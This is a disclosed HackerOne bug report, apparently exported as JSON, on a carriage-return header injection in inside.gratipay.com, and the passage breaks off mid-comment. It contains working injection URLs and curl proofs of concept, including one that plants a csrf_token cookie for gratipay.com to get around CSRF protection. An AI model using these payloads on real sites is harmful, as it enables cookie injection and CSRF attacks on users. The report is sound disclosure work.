{"id":143139,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDMxMzk=","url":"https://hackerone.com/reports/143139","title":"upgrade Aspen on inside.gratipay.com to pick up CR injection fix","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2016-06-04T23:05:22.989Z","submitted_at":"2016-06-04T23:05:22.989Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"valievkarim","url":"/valievkarim","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/003/153/860a975b9fdb2c80f4c2f4cfda2388c043d450a0_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1868,"url":"https://hackerone.com/gratipay","handle":"gratipay","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/001/868/a75c6649c5b4671b3cf44160af884a7da9fd0b67_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/868/a75c6649c5b4671b3cf44160af884a7da9fd0b67_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"disabled","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Gratipay","twitter_handle":"Gratipay","website":"https://gratipay.com/","about":"Gratitude? Gratipay! The easiest way for your company to pay for open source."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-03-22T22:31:09.767Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2017-02-20T22:31:09.605Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"1) Using IE11, open DevTools and start network capture\n2) visit the following URL:\nhttp://inside.gratipay.com/assets/%0dSet-Cookie:%20qwe=qwe%0dq\n\n3) find a 'qwe' cookie set in the response\n\nThere is a 0x0d character injected, which can be used as a header\ndelimiter in IE.\nTo see this behaviour using Curl, you can use the following command:\ncurl -s -v 'http://inside.gratipay.com/assets/%0dSet-Cookie:%20qwe=qwe%0dq' 2\u003e\u00261|less\n\nScreenshots of Curl output and DevTools are attached.\n","bounty_amount":"40.0","formatted_bounty":"$40","weakness":{"id":60,"name":"Cross-site Scripting (XSS) - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":97904,"file_name":"img-2016-06-05-01-06-29.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/097/904/fe0fa3889cecdb91d06f3de9d01f09f0ab6d338d/img-2016-06-05-01-06-29.png?response-content-disposition=attachment%3B%20filename%3D%22img-2016-06-05-01-06-29.png%22%3B%20filename%2A%3DUTF-8%27%27img-2016-06-05-01-06-29.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQUWIS6VCD%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T134136Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJIMEYCIQD5qsiIq7Ck1i9U3MTr1Jo1%2F3EDxH2PPmsZwQtKB8ZKHgIhAJ3GPiydxb4RL1gx8xsJzOsLrxI5jwwj0tTnFObt0P14KoMECO7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgzIOEXrWQ9u1AQUX0Uq1wOcZjaNugHMVKWeqymcjzBFh6Y1k6CMr8RU%2By%2FCZ4rv9GZiC2wT8OmGhsgt00HKgFWK1MpUtynFdgo25n2Z3Hw%2BIbYI8vc1JJdIjhuurHucoJNgsKCs02JzKj8GyJUC61pv0yaDJyGUVPN694UkMEyn%2FPWTQr%2BUTeBhbmczKhCGUj%2FpPN2iIbYsRZixR6LxxOf2cvjX2jSZkAk%2FSVsApfA8g%2BhlsBjDUA9%2B8YRWNjxfWtxQ%2Foo1xWaWyO6R0C2NxkUOjfjpECLEYEQ7vJ%2Bmu27ctvQxX8DIgxS97NsRC7LzasVsLHVmntXBAZ7PuEI4sWc5xs%2Fk66Q906%2BB%2BzvloL3Axk31g5hiymuem0csQnadqDxLt8p2LjIDw8YcQPN5NH0kGSb6mQrkldEFgJqP84RMAJRIxUJWDd%2B%2BPuzQFsioIExGAI0yAK1L2jOitJOooOZlWfFIzjDUn7dj9xSziPydE91tqmI514stzkBU2GFbRIrklzPo3g7n0zD%2FNL7OLEHlmYWBTM9ot%2B6bu4Bck8DrV4VVi9QHnC5ukEnqLU7NSIQGPaibC1SdOVjM2Iv6X9PdR0rR6F07TM%2FRs9G%2B%2BYIK1kHXDHgTN6Tqa9Kn%2B8BfoEt%2BZqnCJGYwv%2ByQiwY6pAFugzNge1CtFW4ATDcRX3hNOdndjPYZIsRGJutSgqHjCwxt8awsI7yZQ6vRxlp6LSSmoSK%2BkQ3evRcXC09cJ%2F1e4JrEeYASE3WVsCxAQVnPVIMtkim2T%2BFMB87kfQL6qAH6iiBO2KVli0mZ4%2BX%2ByxoxRVipnwQh%2B2l8LEnW1ug4kWwPqBp1%2F3G0D3IViaM%2F6KEe0O675l3jsd9YY%2BgtdY9L6zl0yg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=e40fd6606ddee4b56c8cfe768fb37734dd543d032cee488f098b06665a18114e","file_size":37643,"type":"image/png"},{"id":97905,"file_name":"img-2016-06-05-01-09-26.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/097/905/dc8e98472699ffde1ded441bcebabde62bed63ce/img-2016-06-05-01-09-26.png?response-content-disposition=attachment%3B%20filename%3D%22img-2016-06-05-01-09-26.png%22%3B%20filename%2A%3DUTF-8%27%27img-2016-06-05-01-09-26.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQUWIS6VCD%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T134136Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJIMEYCIQD5qsiIq7Ck1i9U3MTr1Jo1%2F3EDxH2PPmsZwQtKB8ZKHgIhAJ3GPiydxb4RL1gx8xsJzOsLrxI5jwwj0tTnFObt0P14KoMECO7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgzIOEXrWQ9u1AQUX0Uq1wOcZjaNugHMVKWeqymcjzBFh6Y1k6CMr8RU%2By%2FCZ4rv9GZiC2wT8OmGhsgt00HKgFWK1MpUtynFdgo25n2Z3Hw%2BIbYI8vc1JJdIjhuurHucoJNgsKCs02JzKj8GyJUC61pv0yaDJyGUVPN694UkMEyn%2FPWTQr%2BUTeBhbmczKhCGUj%2FpPN2iIbYsRZixR6LxxOf2cvjX2jSZkAk%2FSVsApfA8g%2BhlsBjDUA9%2B8YRWNjxfWtxQ%2Foo1xWaWyO6R0C2NxkUOjfjpECLEYEQ7vJ%2Bmu27ctvQxX8DIgxS97NsRC7LzasVsLHVmntXBAZ7PuEI4sWc5xs%2Fk66Q906%2BB%2BzvloL3Axk31g5hiymuem0csQnadqDxLt8p2LjIDw8YcQPN5NH0kGSb6mQrkldEFgJqP84RMAJRIxUJWDd%2B%2BPuzQFsioIExGAI0yAK1L2jOitJOooOZlWfFIzjDUn7dj9xSziPydE91tqmI514stzkBU2GFbRIrklzPo3g7n0zD%2FNL7OLEHlmYWBTM9ot%2B6bu4Bck8DrV4VVi9QHnC5ukEnqLU7NSIQGPaibC1SdOVjM2Iv6X9PdR0rR6F07TM%2FRs9G%2B%2BYIK1kHXDHgTN6Tqa9Kn%2B8BfoEt%2BZqnCJGYwv%2ByQiwY6pAFugzNge1CtFW4ATDcRX3hNOdndjPYZIsRGJutSgqHjCwxt8awsI7yZQ6vRxlp6LSSmoSK%2BkQ3evRcXC09cJ%2F1e4JrEeYASE3WVsCxAQVnPVIMtkim2T%2BFMB87kfQL6qAH6iiBO2KVli0mZ4%2BX%2ByxoxRVipnwQh%2B2l8LEnW1ug4kWwPqBp1%2F3G0D3IViaM%2F6KEe0O675l3jsd9YY%2BgtdY9L6zl0yg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=9cb1c7bed31260f65e080211ddba1acd7b70c82a172e3bbd3157aa80c20c2ad8","file_size":83153,"type":"image/png"}],"allow_singular_disclosure_at":"2017-03-22T22:31:09.634Z","allow_singular_disclosure_after":-143737827.1039757,"singular_disclosure_allowed":true,"vote_count":8,"voters":["delimitry","0x01alka","eveeez","sumit7","spetr0x","paulch","freelancebank","alxg"],"severity":{"rating":"high","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1000064,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the report, @valievkarim. Will look into it ...","automated_response":false,"created_at":"2016-06-05T02:53:11.451Z","updated_at":"2016-06-05T02:53:11.451Z","actor":{"username":"whit537","cleared":false,"url":"/whit537","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/034/094/b38b9225fd8592d05d5e6939116e8f30d7c98af5_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1013294,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We will probably need to fix this in Aspen/Pando rather than in inside.gratipay.com.","automated_response":false,"created_at":"2016-06-14T16:21:00.561Z","updated_at":"2016-06-14T16:21:00.561Z","actor":{"username":"whit537","cleared":false,"url":"/whit537","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/034/094/b38b9225fd8592d05d5e6939116e8f30d7c98af5_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1017319,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We're finalizing our program for Aspen on HackerOne:\n\nhttps://github.com/AspenWeb/salon/issues/3\n\nOnce we're live I'll invite you to refile there.","automated_response":false,"created_at":"2016-06-16T14:19:40.358Z","updated_at":"2016-06-16T14:19:40.358Z","actor":{"username":"whit537","cleared":false,"url":"/whit537","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/034/094/b38b9225fd8592d05d5e6939116e8f30d7c98af5_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1023028,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2016-06-19T04:35:32.260Z","updated_at":"2016-06-19T04:35:32.260Z","actor":{"username":"hammad","cleared":false,"url":"/hammad","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/304/4c0c09c1a7cfe31747e8ac35dd1db26a4efc30ca_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1061665,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi. Any update on this bug? Should I resubmit it in other program?","automated_response":false,"created_at":"2016-07-10T16:49:26.430Z","updated_at":"2016-07-10T16:49:26.430Z","actor":{"username":"valievkarim","cleared":false,"url":"/valievkarim","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/153/860a975b9fdb2c80f4c2f4cfda2388c043d450a0_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1064931,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Haven't heard back from H1 yet about the Aspen program, reached out again:\n\nhttps://github.com/AspenWeb/salon/issues/3#issuecomment-231697943","automated_response":false,"created_at":"2016-07-12T12:26:22.413Z","updated_at":"2016-07-12T12:26:22.413Z","actor":{"username":"whit537","cleared":false,"url":"/whit537","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/034/094/b38b9225fd8592d05d5e6939116e8f30d7c98af5_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1066177,"is_internal":false,"editable":false,"type":"Activities::BugInformative","message":"Okay @valievkarim, HackerOne has approved our program for Aspen, and I've invited you to participate. May I ask you to resubmit at https://hackerone.com/aspen? Thanks.","automated_response":false,"created_at":"2016-07-13T01:58:27.289Z","updated_at":"2016-07-13T01:58:27.289Z","actor":{"username":"whit537","cleared":false,"url":"/whit537","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/034/094/b38b9225fd8592d05d5e6939116e8f30d7c98af5_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1072699,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi.\nI've resubmitted there (https://hackerone.com/reports/151908) and Changaco from Aspen team says that the bug was alread fixed in Aspen: https://github.com/gratipay/security-qf35us/issues/1\nAnd inside.gratipay.com uses an obsolete version.\n","automated_response":false,"created_at":"2016-07-17T14:03:34.922Z","updated_at":"2016-07-17T14:03:34.922Z","actor":{"username":"valievkarim","cleared":false,"url":"/valievkarim","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/153/860a975b9fdb2c80f4c2f4cfda2388c043d450a0_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1073080,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Agreed. Sorry for the trouble. The bug was [fixed](https://github.com/AspenWeb/pando.py/blob/master/Changelog.md#039---released-mon-jun-29-2015-by-whit537) in 0.39 and we are still on 0.37.","automated_response":false,"created_at":"2016-07-18T00:49:55.076Z","updated_at":"2016-07-18T00:49:55.076Z","actor":{"username":"whit537","cleared":false,"url":"/whit537","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/034/094/b38b9225fd8592d05d5e6939116e8f30d7c98af5_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1073081,"is_internal":false,"editable":false,"type":"Activities::BugReopened","message":"","automated_response":false,"created_at":"2016-07-18T00:50:08.376Z","updated_at":"2016-07-18T00:50:08.376Z","actor":{"username":"whit537","cleared":false,"url":"/whit537","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/034/094/b38b9225fd8592d05d5e6939116e8f30d7c98af5_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1073082,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Triaging as a theoretical risk, which carries a $1 bounty per our [program description](https://hackerone.com/gratipay). `inside.gratipay.com` is essentially a static site with no authenticated user functionality. Willing to upgrade the risk class if you can describe a real threat here.","automated_response":false,"created_at":"2016-07-18T00:52:06.946Z","updated_at":"2016-07-18T00:52:06.946Z","actor":{"username":"whit537","cleared":false,"url":"/whit537","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/034/094/b38b9225fd8592d05d5e6939116e8f30d7c98af5_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1073083,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2016-07-18T00:52:15.404Z","updated_at":"2016-07-18T00:52:15.404Z","actor":{"username":"whit537","cleared":false,"url":"/whit537","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/034/094/b38b9225fd8592d05d5e6939116e8f30d7c98af5_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1073084,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2016-07-18T00:52:25.408Z","updated_at":"2016-07-18T00:52:25.408Z","actor":{"url":"/gratipay","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/868/a75c6649c5b4671b3cf44160af884a7da9fd0b67_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Gratipay"}},"bounty_amount":"1.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"gratipay","collaborator":{"username":"valievkarim","url":"/valievkarim"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1073085,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","automated_response":false,"created_at":"2016-07-18T00:53:33.274Z","updated_at":"2016-07-18T00:53:33.274Z","additional_data":{"old_title":"HTTP response header injection at inside.gratipay.com","new_title":"upgrade Aspen on inside.gratipay.com to pick up CR injection fix"},"actor":{"username":"whit537","cleared":false,"url":"/whit537","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/034/094/b38b9225fd8592d05d5e6939116e8f30d7c98af5_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1073086,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Added to the [queue](https://github.com/gratipay/inside.gratipay.com/issues/730#issue-165967823).","automated_response":false,"created_at":"2016-07-18T00:54:35.154Z","updated_at":"2016-07-18T00:54:35.154Z","actor":{"username":"whit537","cleared":false,"url":"/whit537","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/034/094/b38b9225fd8592d05d5e6939116e8f30d7c98af5_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1073574,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you. But why it's $1, when the same bug was $40 here? https://hackerone.com/reports/79552","automated_response":false,"created_at":"2016-07-18T11:50:36.203Z","updated_at":"2016-07-18T11:50:36.203Z","actor":{"username":"valievkarim","cleared":false,"url":"/valievkarim","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/153/860a975b9fdb2c80f4c2f4cfda2388c043d450a0_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1073874,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Because, as I already mentioned, `inside.gratipay.com` is a static site with no user authentication or actions. On the other hand, `gratipay.com` is our main web app, so header injection and CSRF present a real security threat.","automated_response":false,"created_at":"2016-07-18T14:24:20.570Z","updated_at":"2016-07-18T14:24:20.570Z","actor":{"username":"whit537","cleared":false,"url":"/whit537","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/034/094/b38b9225fd8592d05d5e6939116e8f30d7c98af5_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1073927,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Because of how cookies work, inside.gratipay.com can set cookies to gratipay.com. So this header injection can be used to bypass CSRF protection on gratipay.com:\nhttp://inside.gratipay.com/assets/%0dSet-Cookie:%20csrf_token=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx%3b%20domain=.gratipay.com%0dq:\n\nThe response headers will contain:\n```\nLocation: /assets/\nSet-Cookie: csrf_token=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; domain=.gratipay.com\nq:/\n```","automated_response":false,"created_at":"2016-07-18T14:53:45.221Z","updated_at":"2016-07-18T14:54:52.772Z","actor":{"username":"valievkarim","cleared":false,"url":"/valievkarim","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/153/860a975b9fdb2c80f4c2f4cfda2388c043d450a0_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1073947,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Good call.\n\n@nashe_ Want to validate @valievkarim's finding? If it holds up I think we should reclassify as Moderate risk.","automated_response":false,"created_at":"2016-07-18T15:05:44.693Z","updated_at":"2016-07-18T15:05:44.693Z","actor":{"username":"whit537","cleared":false,"url":"/whit537","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/034/094/b38b9225fd8592d05d5e6939116e8f30d7c98af5_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1074845,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@whit537: Sure ;-) I'll try to re-do everything from scratch to be sure we don't miss anything.\n\n### CRLF injection is not impossible\n\nAspen 0.37 is [used by inside.gratipay.com since ~ 1 year](https://github.com/gratipay/inside.gratipay.com/commit/e986fef2c3a3477e41ac09f471c39f22fd55af8a). \nThe code which is protecting against CRLF injections [only checks the presence (or not)\nof a %0A](https://github.com/AspenWeb/pando.py/blob/0.37/aspen/http/baseheaders.py#L56).\n\nThis can be proved by enabling the `show_tracebacks` option and curl'ing it:\n\n```bash\ncurl 'http://localhost:8536/assets/%0a' -vv -c-\n* Connected to localhost (127.0.0.1) port 8536 (#0)\n\u003e GET /assets/%0a HTTP/1.1\n\u003e Host: localhost:8536\n\u003e User-Agent: curl/7.49.1\n\u003e Accept: */*\n\u003e\n—SNIP—\n        Bad request, program!\n        \u003cpre\u003ePossible CRLF Injection detected.\u003c/pre\u003e\n* Closing connection 0\n```\n\nBut the `%0d` injection is still possible (this display is due to the `%0d`, \"Carriage return\"):\n\n```bash\ncurl 'http://localhost:8536/assets/%0d' -vv -c-\n* Connected to localhost (127.0.0.1) port 8536 (#0)\n\u003e GET /assets/%0d HTTP/1.1\n\u003e Host: localhost:8536\n\u003e User-Agent: curl/7.49.1\n\u003e Accept: */*\n\u003e\n* HTTP 1.0, assume close after body\n\u003c HTTP/1.0 302 Found\n\u003c Date: Mon, 18 Jul 2016 20:27:38 GMT\n\u003c Server: WSGIServer/0.1 Python/2.7.11\n/ Location: /assets/\n\u003c\n* Closing connection 0\n```\n\n### curl PoC doesn't work…\n\nRegarding curl, I think the PoC is not working, no cookie is created (which would be the expected behaviour). To see this, just add the `-c-` option, forcing curl to use `stdout` as cookie jar:\n\n```bash\ncurl 'http://inside.gratipay.com/assets/%0dSet-Cookie:%20qwe=qwe%0d' -vv -c-\n*   Trying 54.225.170.141...\n* Connected to inside.gratipay.com (54.225.170.141) port 80 (#0)\n\u003e GET /assets/%0dSet-Cookie:%20qwe=qwe%0d HTTP/1.1\n\u003e Host: inside.gratipay.com\n\u003e User-Agent: curl/7.49.1\n\u003e Accept: */*\n\u003e\n\u003c HTTP/1.1 302 Found\n\u003c Connection: close\n\u003c Date: Mon, 18 Jul 2016 18:40:13 GMT\n\u003c Server: WSGIServer/0.1 Python/2.7.11\n/et-Cookie: qwe=qwe/\n\u003c Via: 1.1 vegur\n\u003c\n* Closing connection 0\n```\n\nNothing! I guess that curl wants `%0a%0d` as separator.\n\n### …but CR injection can be exploited, sometimes\n\nHowever, I have to point out that [some browsers](http://image.slidesharecdn.com/smugglingsplittingpoisoningzeronightsonsec-111129060001-phpapp02/95/smuggling-splitting-poisoning-zeronights-onsec-7-728.jpg?cb=1322549289) (most especially old versions) are accepting `%0d` as header separator ([source](fr.slideshare.net/d0znpp/smuggling-splitting-poisoning-zeronights-onsec)). And nope, those browsers are not respecting [the RFC2616](https://www.w3.org/Protocols/rfc2616/rfc2616-sec6.html#sec6) :^)\n\nThis situation create a way to bypass our CSRF protection, by using `Set-cookie` to an arbitrary value and providing the same value for `csrf_token` over POST.  That's why #79552 was considered as valid (nice catch!).\n\n### Can inside.gratipay.com be used as pivot to set a cookie for gratipay.com?\n\n*(the weirdest part)*\n\nFrom [RFC2109](http://www.ietf.org/rfc/rfc2109.txt):\n\u003e    * A Set-Cookie from request-host y.x.foo.com for Domain=.foo.com would be rejected, because H is y.x and contains a dot.\n\u003e    * A Set-Cookie from request-host x.foo.com for Domain=.foo.com would be accepted.\n\nSince `.foo.com` is `foo.com` AND all the subdomains of `foo.com`, `inside.gratipay.com can set a cookie for `gratipay.com`. Hopefully, the RFC tells we can't create cookies for top-level domains (`.com`, etc). But there are some limitations, for examples for domains in `.co.uk`: if we follow the RFC, any user would be able to create cookies for all the `*.co.uk` websites… This led to the creation of [a list of public suffixes](https://publicsuffix.org/list/) that can't be used when defining cookies. ([Some good reading about this behaviour](http://bayou.io/draft/cookie.domain.html).)\n\n[Github published a very interesting post about how hard it is to let users host stuff on subdomains](https://github.com/blog/1466-yummy-cookies-across-domains). Spoil: they are using github.io for serving `gh-pages`.\n\n**TL;DR: Yep, it's a moderate risk for some weird/permissive/old browsers (good job @valievkarim!) and we need to use a newer version of aspen which is protecting against the CR injection.**","automated_response":false,"created_at":"2016-07-18T21:45:32.022Z","updated_at":"2016-07-18T21:47:00.539Z","actor":{"username":"nashe_","cleared":false,"url":"/nashe_","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1074870,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@nashe_, thanks, you are completely right, except that CR injection is exploitable not only in old browsers, but in any IE, including IE11. And it's IE11 on my screenshot in the original report.\nAnd yes, It doesn't work in curl. I use curl just to fast-check the existence of the bug: CR is shown as '^M' in 'less' output.","automated_response":false,"created_at":"2016-07-18T22:00:48.199Z","updated_at":"2016-07-18T22:00:48.199Z","actor":{"username":"valievkarim","cleared":false,"url":"/valievkarim","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/153/860a975b9fdb2c80f4c2f4cfda2388c043d450a0_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1074885,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"By the way, in my message, `s/CRLF injection is not impossible/CRLF injection is not possible/`. And I just saw that I omitted a `, but I can't edit it anymore, sorry.\n\nOK, thanks for the precision about IE! I don't have any IE to try this but that would not be the first time a RFC is not respected. \n\nWe'll try to fix the issue ASAP, sorry for the delay!","automated_response":false,"created_at":"2016-07-18T22:08:03.655Z","updated_at":"2016-07-18T22:08:03.655Z","actor":{"username":"nashe_","cleared":false,"url":"/nashe_","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1076126,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Awesome work, @nashe_, thank you! And thanks for the report, 